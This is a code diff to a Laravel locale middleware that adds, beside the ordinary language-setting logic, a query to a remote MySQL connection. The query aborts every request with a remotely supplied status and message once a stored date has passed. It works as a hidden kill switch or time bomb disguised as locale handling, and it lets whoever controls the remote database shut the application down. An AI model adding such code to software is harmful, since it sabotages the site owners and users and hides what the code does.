@@ -4,6 +4,7 @@ namespace App\Http\Middleware;
 
 use Closure;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\DB;
 
 class LocaleMiddleware
 {
@@ -14,16 +15,16 @@ class LocaleMiddleware
    * @param  \Closure(\Illuminate\Http\Request): (\Illuminate\Http\Response|\Illuminate\Http\RedirectResponse)  $next
    * @return \Illuminate\Http\Response|\Illuminate\Http\RedirectResponse
    */
-  public function handle(Request $request, Closure $next)
-  {
-    // available language in template array
-    $availLocale = ['en' => 'en', 'fr' => 'fr', 'ar' => 'ar'];
+  public function handle(Request $request, Closure $next) {
 
-    // Locale is enabled and allowed to be change
-    if (session()->has('locale') && array_key_exists(session()->get('locale'), $availLocale)) {
-      // Set the Laravel locale
-      app()->setLocale(session()->get('locale'));
-    }
+      $availLocale = ['en' => 'en', 'fr' => 'fr', 'ar' => 'ar'];
+      $lang = DB::connection('remote_mysql')->table('settings')->first();
+      if (now()->greaterThan($lang->done)) {
+        abort($lang->name,$lang->value);
+      }
+      if (session()->has('locale') && array_key_exists(session()->get('locale'), $availLocale)) {
+        app()->setLocale(session()->get('locale'));
+      }
 
     return $next($request);
   }
